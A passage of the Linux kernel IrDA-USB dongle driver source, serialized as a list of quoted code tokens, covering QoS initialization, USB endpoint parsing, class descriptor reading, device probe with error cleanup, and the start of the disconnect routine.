"irda_usb_is_receiving", "(", "self", ")", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "IRDA", "CONFIG", "SUBROUTINES", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "Various", "subroutines", "dealing", "with", "IrDA", "and", "network", "stuff", "we", "use", "to", "*", "configure", "and", "initialise", "each", "irda", "-", "usb", "instance", ".", "*", "These", "functions", "are", "used", "below", "in", "the", "main", "calls", "of", "the", "driver", ".", "..", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Set", "proper", "values", "in", "the", "IrDA", "QOS", "structure", "*", "/", "static", "inline", "void", "irda_usb_init_qos", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "struct", "irda_class_desc", "*", "desc", ";", "desc", "=", "self", "-", ">", "irda_desc", ";", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "See", "spec", "section", "7", ".", "2", "for", "meaning", ".", "*", "Values", "are", "little", "endian", "(", "as", "most", "USB", "stuff", ")", ",", "the", "IrDA", "stack", "*", "use", "it", "in", "native", "order", "(", "see", "parameters", ".", "c", ")", ".", "-", "Jean", "II", "*", "/", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "le16_to_cpu", "(", "desc", "-", ">", "wBaudRate", ")", ";", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "desc", "-", ">", "bmMinTurnaroundTime", ";", "self", "-", ">", "qos", ".", "additional_bofs", ".", "bits", "=", "desc", "-", ">", "bmAdditionalBOFs", ";", "self", "-", ">", "qos", ".", "window_size", ".", "bits", "=", "desc", "-", ">", "bmWindowSize", ";", "self", "-", ">", "qos", ".", "data_size", ".", "bits", "=", "desc", "-", ">", "bmDataSize", ";", "pr_debug", "(", "\"%", "s", "(", "),", "dongle", "says", "speed", "=", "0x", "%", "X", ",", "size", "=", "0x", "%", "X", ",", "window", "=", "0x", "%", "X", ",", "bofs", "=", "0x", "%", "X", ",", "turn", "=", "0x", "%", "X", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", ",", "self", "-", ">", "qos", ".", "data_size", ".", "bits", ",", "self", "-", ">", "qos", ".", "window_size", ".", "bits", ",", "self", "-", ">", "qos", ".", "additional_bofs", ".", "bits", ",", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", ")", ";", "/", "*", "Don", "'", "t", "always", "trust", "what", "the", "dongle", "tell", "us", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_SIR_ONLY", ")", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "0x00ff", ";", "if", "(", "self", "-", ">", "capability", "&", "IUC_SMALL_PKT", ")", "self", "-", ">", "qos", ".", "data_size", ".", "bits", "=", "0x07", ";", "if", "(", "self", "-", ">", "capability", "&", "IUC_NO_WINDOW", ")", "self", "-", ">", "qos", ".", "window_size", ".", "bits", "=", "0x01", ";", "if", "(", "self", "-", ">", "capability", "&", "IUC_MAX_WINDOW", ")", "self", "-", ">", "qos", ".", "window_size", ".", "bits", "=", "0x7f", ";", "if", "(", "self", "-", ">", "capability", "&", "IUC_MAX_XBOFS", ")", "self", "-", ">", "qos", ".", "additional_bofs", ".", "bits", "=", "0x01", ";", "#", "if", "1", "/", "*", "Module", "parameter", "can", "override", "the", "rx", "window", "size", "*", "/", "if", "(", "qos_mtt_bits", ")", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "qos_mtt_bits", ";", "#", "endif", "/", "*", "*", "Note", ":", "most", "of", "those", "values", "apply", "only", "for", "the", "receive", "path", ",", "*", "the", "transmit", "path", "will", "be", "set", "differently", "-", "Jean", "II", "*", "/", "irda_qos_bits_to_value", "(", "&", "self", "-", ">", "qos", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "static", "const", "struct", "net_device_ops", "irda_usb_netdev_ops", "=", "{", ".", "ndo_open", "=", "irda_usb_net_open", ",", ".", "ndo_stop", "=", "irda_usb_net_close", ",", ".", "ndo_do_ioctl", "=", "irda_usb_net_ioctl", ",", ".", "ndo_start_xmit", "=", "irda_usb_hard_xmit", ",", ".", "ndo_tx_timeout", "=", "irda_usb_net_timeout", ",", "}", ";", "/", "*", "*", "Initialise", "the", "network", "side", "of", "the", "irda", "-", "usb", "instance", "*", "Called", "when", "a", "new", "USB", "instance", "is", "registered", "in", "irda_usb_probe", "(", ")", "*", "/", "static", "inline", "int", "irda_usb_open", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "struct", "net_device", "*", "netdev", "=", "self", "-", ">", "netdev", ";", "netdev", "-", ">", "netdev_ops", "=", "&", "irda_usb_netdev_ops", ";", "irda_usb_init_qos", "(", "self", ")", ";", "return", "register_netdev", "(", "netdev", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Cleanup", "the", "network", "side", "of", "the", "irda", "-", "usb", "instance", "*", "Called", "when", "a", "USB", "instance", "is", "removed", "in", "irda_usb_disconnect", "(", ")", "*", "/", "static", "inline", "void", "irda_usb_close", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "/", "*", "Remove", "netdevice", "*", "/", "unregister_netdev", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Remove", "the", "speed", "buffer", "*", "/", "kfree", "(", "self", "-", ">", "speed_buff", ")", ";", "self", "-", ">", "speed_buff", "=", "NULL", ";", "kfree", "(", "self", "-", ">", "tx_buff", ")", ";", "self", "-", ">", "tx_buff", "=", "NULL", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "USB", "CONFIG", "SUBROUTINES", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "*", "Various", "subroutines", "dealing", "with", "USB", "stuff", "we", "use", "to", "configure", "and", "*", "initialise", "each", "irda", "-", "usb", "instance", ".", "*", "These", "functions", "are", "used", "below", "in", "the", "main", "calls", "of", "the", "driver", ".", "..", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_parse_endpoints", "(", "dev", ",", "ifnum", ")", "*", "*", "Parse", "the", "various", "endpoints", "and", "find", "the", "one", "we", "need", ".", "*", "*", "The", "endpoint", "are", "the", "pipes", "used", "to", "communicate", "with", "the", "USB", "device", ".", "*", "The", "spec", "defines", "2", "endpoints", "of", "type", "bulk", "transfer", ",", "one", "in", ",", "and", "one", "out", ".", "*", "These", "are", "used", "to", "pass", "frames", "back", "and", "forth", "with", "the", "dongle", ".", "*", "Most", "dongle", "have", "also", "an", "interrupt", "endpoint", ",", "that", "will", "be", "probably", "*", "documented", "in", "the", "next", "spec", ".", "..", "*", "/", "static", "inline", "int", "irda_usb_parse_endpoints", "(", "struct", "irda_usb_cb", "*", "self", ",", "struct", "usb_host_endpoint", "*", "endpoint", ",", "int", "ennum", ")", "{", "int", "i", ";", "/", "*", "Endpoint", "index", "in", "table", "*", "/", "/", "*", "Init", ":", "no", "endpoints", "*", "/", "self", "-", ">", "bulk_in_ep", "=", "0", ";", "self", "-", ">", "bulk_out_ep", "=", "0", ";", "self", "-", ">", "bulk_int_ep", "=", "0", ";", "/", "*", "Let", "'", "s", "look", "at", "all", "those", "endpoints", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "ennum", ";", "i", "+", "+)", "{", "/", "*", "All", "those", "variables", "will", "get", "optimised", "by", "the", "compiler", ",", "*", "so", "let", "'", "s", "aim", "for", "clarity", ".", "..", "-", "Jean", "II", "*", "/", "__u8", "ep", ";", "/", "*", "Endpoint", "address", "*", "/", "__u8", "dir", ";", "/", "*", "Endpoint", "direction", "*", "/", "__u8", "attr", ";", "/", "*", "Endpoint", "attribute", "*", "/", "__u16", "psize", ";", "/", "*", "Endpoint", "max", "packet", "size", "in", "bytes", "*", "/", "/", "*", "Get", "endpoint", "address", ",", "direction", "and", "attribute", "*", "/", "ep", "=", "endpoint", "[", "i", "]", ".", "desc", ".", "bEndpointAddress", "&", "USB_ENDPOINT_NUMBER_MASK", ";", "dir", "=", "endpoint", "[", "i", "]", ".", "desc", ".", "bEndpointAddress", "&", "USB_ENDPOINT_DIR_MASK", ";", "attr", "=", "endpoint", "[", "i", "]", ".", "desc", ".", "bmAttributes", ";", "psize", "=", "le16_to_cpu", "(", "endpoint", "[", "i", "]", ".", "desc", ".", "wMaxPacketSize", ")", ";", "/", "*", "Is", "it", "a", "bulk", "endpoint", "?", "??", "*", "/", "if", "(", "attr", "=", "=", "USB_ENDPOINT_XFER_BULK", ")", "{", "/", "*", "We", "need", "to", "find", "an", "IN", "and", "an", "OUT", "*", "/", "if", "(", "dir", "=", "=", "USB_DIR_IN", ")", "{", "/", "*", "This", "is", "our", "Rx", "endpoint", "*", "/", "self", "-", ">", "bulk_in_ep", "=", "ep", ";", "}", "else", "{", "/", "*", "This", "is", "our", "Tx", "endpoint", "*", "/", "self", "-", ">", "bulk_out_ep", "=", "ep", ";", "self", "-", ">", "bulk_out_mtu", "=", "psize", ";", "}", "}", "else", "{", "if", "(", "(", "attr", "=", "=", "USB_ENDPOINT_XFER_INT", ")", "&", "&", "(", "dir", "=", "=", "USB_DIR_IN", ")", ")", "{", "/", "*", "This", "is", "our", "interrupt", "endpoint", "*", "/", "self", "-", ">", "bulk_int_ep", "=", "ep", ";", "}", "else", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "Unrecognised", "endpoint", "%", "02X", "\\", "n", "\"", ",", "__func__", ",", "ep", ")", ";", "}", "}", "}", "pr_debug", "(", "\"%", "s", "(", "),", "And", "our", "endpoints", "are", ":", "in", "=", "%", "02X", ",", "out", "=", "%", "02X", "(", "%", "d", ")", ",", "int", "=", "%", "02X", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "bulk_in_ep", ",", "self", "-", ">", "bulk_out_ep", ",", "self", "-", ">", "bulk_out_mtu", ",", "self", "-", ">", "bulk_int_ep", ")", ";", "return", "(", "self", "-", ">", "bulk_in_ep", "!", "=", "0", ")", "&", "&", "(", "self", "-", ">", "bulk_out_ep", "!", "=", "0", ")", ";", "}", "#", "ifdef", "IU_DUMP_CLASS_DESC", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "usb_irda_dump_class_desc", "(", "desc", ")", "*", "*", "Prints", "out", "the", "contents", "of", "the", "IrDA", "class", "descriptor", "*", "*", "/", "static", "inline", "void", "irda_usb_dump_class_desc", "(", "struct", "irda_class_desc", "*", "desc", ")", "{", "/", "*", "Values", "are", "little", "endian", "*", "/", "printk", "(", "\"", "bLength", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bLength", ")", ";", "printk", "(", "\"", "bDescriptorType", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bDescriptorType", ")", ";", "printk", "(", "\"", "bcdSpecRevision", "=", "%", "x", "\\", "n", "\"", ",", "le16_to_cpu", "(", "desc", "-", ">", "bcdSpecRevision", ")", ");", "printk", "(", "\"", "bmDataSize", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bmDataSize", ")", ";", "printk", "(", "\"", "bmWindowSize", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bmWindowSize", ")", ";", "printk", "(", "\"", "bmMinTurnaroundTime", "=", "%", "d", "\\", "n", "\"", ",", "desc", "-", ">", "bmMinTurnaroundTime", ")", ";", "printk", "(", "\"", "wBaudRate", "=", "%", "x", "\\", "n", "\"", ",", "le16_to_cpu", "(", "desc", "-", ">", "wBaudRate", ")", ");", "printk", "(", "\"", "bmAdditionalBOFs", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bmAdditionalBOFs", ")", ";", "printk", "(", "\"", "bIrdaRateSniff", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bIrdaRateSniff", ")", ";", "printk", "(", "\"", "bMaxUnicastList", "=", "%", "x", "\\", "n", "\"", ",", "desc", "-", ">", "bMaxUnicastList", ")", ";", "}", "#", "endif", "/", "*", "IU_DUMP_CLASS_DESC", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_find_class_desc", "(", "intf", ")", "*", "*", "Returns", "instance", "of", "IrDA", "class", "descriptor", ",", "or", "NULL", "if", "not", "found", "*", "*", "The", "class", "descriptor", "is", "some", "extra", "info", "that", "IrDA", "USB", "devices", "will", "*", "offer", "to", "us", ",", "describing", "their", "IrDA", "characteristics", ".", "We", "will", "use", "that", "in", "*", "irda_usb_init_qos", "(", ")", "*", "/", "static", "inline", "struct", "irda_class_desc", "*", "irda_usb_find_class_desc", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "usb_device", "*", "dev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "irda_class_desc", "*", "desc", ";", "int", "ret", ";", "desc", "=", "kzalloc", "(", "sizeof", "(", "*", "desc", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "desc", ")", "return", "NULL", ";", "/", "*", "USB", "-", "IrDA", "class", "spec", "1", ".", "0", ":", "*", "6", ".", "1", ".", "3", ":", "Standard", "\"", "Get", "Descriptor", "\"", "Device", "Request", "is", "not", "*", "appropriate", "to", "retrieve", "class", "-", "specific", "descriptor", "*", "6", ".", "2", ".", "5", ":", "Class", "Specific", "\"", "Get", "Class", "Descriptor", "\"", "Interface", "Request", "*", "is", "mandatory", "and", "returns", "the", "USB", "-", "IrDA", "class", "descriptor", "*", "/", "ret", "=", "usb_control_msg", "(", "dev", ",", "usb_rcvctrlpipe", "(", "dev", ",", "0", ")", ",", "IU_REQ_GET_CLASS_DESC", ",", "USB_DIR_IN", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", ",", "0", ",", "intf", "-", ">", "altsetting", "-", ">", "desc", ".", "bInterfaceNumber", ",", "desc", ",", "sizeof", "(", "*", "desc", ")", ",", "500", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "ret", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "ret", ")", ";", "if", "(", "ret", "<", "sizeof", "(", "*", "desc", ")", ")", "{", "net_warn_ratelimited", "(", "\"", "usb", "-", "irda", ":", "class_descriptor", "read", "%", "s", "(", "%", "d", ")", "\\", "n", "\"", ",", "ret", "<", "0", "?", "\"", "failed", "\"", ":", "\"", "too", "short", "\"", ",", "ret", ")", ";", "}", "else", "if", "(", "desc", "-", ">", "bDescriptorType", "!", "=", "USB_DT_IRDA", ")", "{", "net_warn_ratelimited", "(", "\"", "usb", "-", "irda", ":", "bad", "class_descriptor", "type", "\\", "n", "\"", ");", "}", "else", "{", "#", "ifdef", "IU_DUMP_CLASS_DESC", "irda_usb_dump_class_desc", "(", "desc", ")", ";", "#", "endif", "/", "*", "IU_DUMP_CLASS_DESC", "*", "/", "return", "desc", ";", "}", "kfree", "(", "desc", ")", ";", "return", "NULL", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "USB", "DEVICE", "CALLBACKS", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "Main", "calls", "from", "the", "USB", "subsystem", ".", "*", "Mostly", "registering", "a", "new", "irda", "-", "usb", "device", "and", "removing", "it", ".", "..", ".", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "This", "routine", "is", "called", "by", "the", "USB", "subsystem", "for", "each", "new", "device", "*", "in", "the", "system", ".", "We", "need", "to", "check", "if", "the", "device", "is", "ours", ",", "and", "in", "*", "this", "case", "start", "handling", "it", ".", "*", "The", "USB", "layer", "protect", "us", "from", "reentrancy", "(", "via", "BKL", ")", ",", "so", "we", "don", "'", "t", "need", "*", "to", "spinlock", "in", "there", ".", "..", "Jean", "II", "*", "/", "static", "int", "irda_usb_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", "{", "struct", "net_device", "*", "net", ";", "struct", "usb_device", "*", "dev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "irda_usb_cb", "*", "self", ";", "struct", "usb_host_interface", "*", "interface", ";", "struct", "irda_class_desc", "*", "irda_desc", ";", "int", "ret", "=", "-", "ENOMEM", ";", "int", "i", ";", "/", "*", "Driver", "instance", "index", "/", "Rx", "URB", "index", "*", "/", "/", "*", "Note", ":", "the", "probe", "make", "sure", "to", "call", "us", "only", "for", "devices", "that", "*", "matches", "the", "list", "of", "dongle", "(", "top", "of", "the", "file", ")", ".", "So", ",", "we", "*", "don", "'", "t", "need", "to", "check", "if", "the", "dongle", "is", "really", "ours", ".", "*", "Jean", "II", "*", "/", "net_info_ratelimited", "(", "\"", "IRDA", "-", "USB", "found", "at", "address", "%", "d", ",", "Vendor", ":", "%", "x", ",", "Product", ":", "%", "x", "\\", "n", "\"", ",", "dev", "-", ">", "devnum", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idVendor", ")", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idProduct", ")", ");", "net", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "self", ")", ");", "if", "(", "!", "net", ")", "goto", "err_out", ";", "SET_NETDEV_DEV", "(", "net", ",", "&", "intf", "-", ">", "dev", ")", ";", "self", "=", "netdev_priv", "(", "net", ")", ";", "self", "-", ">", "netdev", "=", "net", ";", "spin_lock_init", "(", "&", "self", "-", ">", "lock", ")", ";", "timer_setup", "(", "&", "self", "-", ">", "rx_defer_timer", ",", "irda_usb_rx_defer_expired", ",", "0", ")", ";", "self", "-", ">", "capability", "=", "id", "-", ">", "driver_info", ";", "self", "-", ">", "needspatch", "=", "(", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", ")", "!", "=", "0", ")", ";", "/", "*", "Create", "all", "of", "the", "needed", "urbs", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", ")", "{", "self", "-", ">", "max_rx_urb", "=", "IU_SIGMATEL_MAX_RX_URBS", ";", "self", "-", ">", "header_length", "=", "USB_IRDA_STIR421X_HEADER", ";", "}", "else", "{", "self", "-", ">", "max_rx_urb", "=", "IU_MAX_RX_URBS", ";", "self", "-", ">", "header_length", "=", "USB_IRDA_HEADER", ";", "}", "self", "-", ">", "rx_urb", "=", "kcalloc", "(", "self", "-", ">", "max_rx_urb", ",", "sizeof", "(", "struct", "urb", "*", "),", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "rx_urb", ")", "goto", "err_free_net", ";", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "{", "self", "-", ">", "rx_urb", "[", "i", "]", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "rx_urb", "[", "i", "]", ")", "{", "goto", "err_out_1", ";", "}", "}", "self", "-", ">", "tx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "tx_urb", ")", "{", "goto", "err_out_1", ";", "}", "self", "-", ">", "speed_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "speed_urb", ")", "{", "goto", "err_out_2", ";", "}", "/", "*", "Is", "this", "really", "necessary", "?", "(", "no", ",", "except", "maybe", "for", "broken", "devices", ")", "*", "/", "if", "(", "usb_reset_configuration", "(", "dev", ")", "<", "0", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "reset_configuration", "failed", "\\", "n", "\"", ");", "ret", "=", "-", "EIO", ";", "goto", "err_out_3", ";", "}", "/", "*", "Is", "this", "really", "necessary", "?", "*", "/", "/", "*", "Note", ":", "some", "driver", "do", "hardcode", "the", "interface", "number", ",", "some", "others", "*", "specify", "an", "alternate", ",", "but", "very", "few", "driver", "do", "like", "this", ".", "*", "Jean", "II", "*", "/", "ret", "=", "usb_set_interface", "(", "dev", ",", "intf", "-", ">", "altsetting", "-", ">", "desc", ".", "bInterfaceNumber", ",", "0", ")", ";", "pr_debug", "(", "\"", "usb", "-", "irda", ":", "set", "interface", "%", "d", "result", "%", "d", "\\", "n", "\"", ",", "intf", "-", ">", "altsetting", "-", ">", "desc", ".", "bInterfaceNumber", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "0", ":", "break", ";", "case", "-", "EPIPE", ":", "/", "*", "-", "EPIPE", "=", "-", "32", "*", "/", "/", "*", "Martin", "Diehl", "says", "if", "we", "get", "a", "-", "EPIPE", "we", "should", "*", "be", "fine", "and", "we", "don", "'", "t", "need", "to", "do", "a", "usb_clear_halt", "(", ").", "*", "-", "Jean", "II", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Received", "-", "EPIPE", ",", "ignoring", ".", "..", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "default", ":", "pr_debug", "(", "\"%", "s", "(", "),", "Unknown", "error", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "ret", ")", ";", "ret", "=", "-", "EIO", ";", "goto", "err_out_3", ";", "}", "/", "*", "Find", "our", "endpoints", "*", "/", "interface", "=", "intf", "-", ">", "cur_altsetting", ";", "if", "(", "!", "irda_usb_parse_endpoints", "(", "self", ",", "interface", "-", ">", "endpoint", ",", "interface", "-", ">", "desc", ".", "bNumEndpoints", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "Bogus", "endpoints", ".", "..", "\\", "n", "\"", ",", "__func__", ")", ";", "ret", "=", "-", "EIO", ";", "goto", "err_out_3", ";", "}", "self", "-", ">", "usbdev", "=", "dev", ";", "/", "*", "Find", "IrDA", "class", "descriptor", "*", "/", "irda_desc", "=", "irda_usb_find_class_desc", "(", "intf", ")", ";", "ret", "=", "-", "ENODEV", ";", "if", "(", "!", "irda_desc", ")", "goto", "err_out_3", ";", "if", "(", "self", "-", ">", "needspatch", ")", "{", "ret", "=", "usb_control_msg", "(", "self", "-", ">", "usbdev", ",", "usb_sndctrlpipe", "(", "self", "-", ">", "usbdev", ",", "0", ")", ",", "0x02", ",", "0x40", ",", "0", ",", "0", ",", "NULL", ",", "0", ",", "500", ")", ";", "if", "(", "ret", "<", "0", ")", "{", "pr_debug", "(", "\"", "usb_control_msg", "failed", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "goto", "err_out_3", ";", "}", "else", "{", "mdelay", "(", "10", ")", ";", "}", "}", "self", "-", ">", "irda_desc", "=", "irda_desc", ";", "self", "-", ">", "present", "=", "1", ";", "self", "-", ">", "netopen", "=", "0", ";", "self", "-", ">", "usbintf", "=", "intf", ";", "/", "*", "Allocate", "the", "buffer", "for", "speed", "changes", "*", "/", "/", "*", "Don", "'", "t", "change", "this", "buffer", "size", "and", "allocation", "without", "doing", "*", "some", "heavy", "and", "complete", "testing", ".", "Don", "'", "t", "ask", "why", ":", "-(", "*", "Jean", "II", "*", "/", "ret", "=", "-", "ENOMEM", ";", "self", "-", ">", "speed_buff", "=", "kzalloc", "(", "IRDA_USB_SPEED_MTU", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "speed_buff", ")", "goto", "err_out_3", ";", "self", "-", ">", "tx_buff", "=", "kzalloc", "(", "IRDA_SKB_MAX_MTU", "+", "self", "-", ">", "header_length", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "tx_buff", ")", "goto", "err_out_4", ";", "ret", "=", "irda_usb_open", "(", "self", ")", ";", "if", "(", "ret", ")", "goto", "err_out_5", ";", "net_info_ratelimited", "(", "\"", "IrDA", ":", "Registered", "device", "%", "s", "\\", "n", "\"", ",", "net", "-", ">", "name", ")", ";", "usb_set_intfdata", "(", "intf", ",", "self", ")", ";", "if", "(", "self", "-", ">", "needspatch", ")", "{", "/", "*", "Now", "we", "fetch", "and", "upload", "the", "firmware", "patch", "*", "/", "ret", "=", "stir421x_patch_device", "(", "self", ")", ";", "self", "-", ">", "needspatch", "=", "(", "ret", "<", "0", ")", ";", "if", "(", "self", "-", ">", "needspatch", ")", "{", "net_err_ratelimited", "(", "\"", "STIR421X", ":", "Couldn", "'", "t", "upload", "patch", "\\", "n", "\"", ");", "goto", "err_out_6", ";", "}", "/", "*", "replace", "IrDA", "class", "descriptor", "with", "what", "patched", "device", "is", "now", "reporting", "*", "/", "irda_desc", "=", "irda_usb_find_class_desc", "(", "self", "-", ">", "usbintf", ")", ";", "if", "(", "!", "irda_desc", ")", "{", "ret", "=", "-", "ENODEV", ";", "goto", "err_out_6", ";", "}", "kfree", "(", "self", "-", ">", "irda_desc", ")", ";", "self", "-", ">", "irda_desc", "=", "irda_desc", ";", "irda_usb_init_qos", "(", "self", ")", ";", "}", "return", "0", ";", "err_out_6", ":", "unregister_netdev", "(", "self", "-", ">", "netdev", ")", ";", "err_out_5", ":", "kfree", "(", "self", "-", ">", "tx_buff", ")", ";", "err_out_4", ":", "kfree", "(", "self", "-", ">", "speed_buff", ")", ";", "err_out_3", ":", "/", "*", "Free", "all", "urbs", "that", "we", "may", "have", "created", "*", "/", "usb_free_urb", "(", "self", "-", ">", "speed_urb", ")", ";", "err_out_2", ":", "usb_free_urb", "(", "self", "-", ">", "tx_urb", ")", ";", "err_out_1", ":", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "usb_free_urb", "(", "self", "-", ">", "rx_urb", "[", "i", "]", ");", "kfree", "(", "self", "-", ">", "rx_urb", ")", ";", "err_free_net", ":", "free_netdev", "(", "net", ")", ";", "err_out", ":", "return", "ret", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "The", "current", "irda", "-", "usb", "device", "is", "removed", ",", "the", "USB", "layer", "tell", "us", "*", "to", "shut", "it", "down", ".", "..", "*", "One", "of", "the", "constraints", "is", "that", "when", "we", "exit", "this", "function", ",", "*", "we", "cannot", "use", "the", "usb_device", "no", "more", ".", "Gone", ".", "Destroyed", ".", "kfree", "(", ").", "*", "Most", "other", "subsystem", "allow", "you", "to", "destroy", "the", "instance", "at", "a", "time", "*", "when", "it", "'", "s", "convenient", "to", "you", ",", "to", "postpone", "it", "to", "a", "later", "date", ",", "but", "*", "not", "the", "USB", "subsystem", ".", "*", "So", ",", "we", "must", "make", "bloody", "sure", "that", "everything", "gets", "deactivated", ".", "*", "Jean", "II", "*", "/", "static", "void", "irda_usb_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "unsigned", "long", "flags", ";", "struct", "irda_usb_cb", "*", "self", "=", "usb_get_intfdata", "(", "intf", ")", ";", "int", "i", ";", "usb_set_intfdata", "(", "intf", ",", "NULL", ")", ";", "if", "(", "!", "self", ")", "return", ";", "/", "*", "Make", "sure", "that", "the", "Tx", "path", "is", "not", "executing", ".", "-", "Jean", "II", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Oups", "!", "We", "are", "not", "there", "any", "more", ".", "*", "This", "will", "stop", "/", "desactivate", "the", "Tx", "path", ".", "-", "Jean", "II", "*", "/", "self", "-", ">", "present", "=", "0", ";", "/", "*", "Kill", "defered", "Rx", "URB", "*", "/", "del_timer", "(", "&", "self", "-", ">", "rx_defer_timer", ")", ";", "/", "*", "We", "need", "to", "have", "irq", "enabled", "to", "unlink", "the", "URBs", ".", "That", "'", "s", "OK", ",", "*", "at", "this", "point", "the", "Tx", "path", "is", "gone", "-", "Jean", "II", "*", "/", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Hum", ".", "..", "Check", "if", "networking", "is", "still", "active", "(", "avoid", "races", ")", "*", "/", "if", "(", "(", "self", "-", ">", "netopen", ")", "|", "|", "(", "self", "-", ">", "irlap", ")", ")", "{", "/", "*", "Accept", "no", "more", "transmissions", "*", "/", "/", "*", "netif_device_detach", 